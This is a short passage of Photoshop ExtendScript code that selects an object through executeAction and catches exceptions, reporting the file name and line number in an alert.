        desc1.putReference(cTID('null'), ref1);
        app.executeAction(sTID('select'), desc1, DialogModes.NO);
      } catch (e) { e }
    }
  }
} catch (e) { alert("Exception-2:" + e + '(' + File(e.fileName).name + '-' + e.line + ')', ' '), e }
